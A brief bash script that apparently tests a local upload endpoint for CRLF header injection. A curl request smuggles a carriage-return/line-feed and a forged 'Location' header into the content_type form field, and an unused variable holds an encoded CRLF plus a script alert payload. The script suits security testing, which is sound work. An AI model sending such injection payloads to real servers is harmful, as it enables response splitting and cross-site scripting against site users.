#!/usr/bin/env bash
set -xeuo pipefail                                           

UPLOAD_URL="http://127.0.0.1:5000/upload"            

ALERT="text/html%0d%0a%0d%0a%3Cscript%3Ealert%280%29%3C/script%3E"

# Use curl to upload the file with a manipulated  %0D%0A
curl -X POST -H "Content-Type: multipart/form-data" "$UPLOAD_URL" \
    -F "file=@image.png" -F "content_type=image/png\r\nLocation: http://example.com" 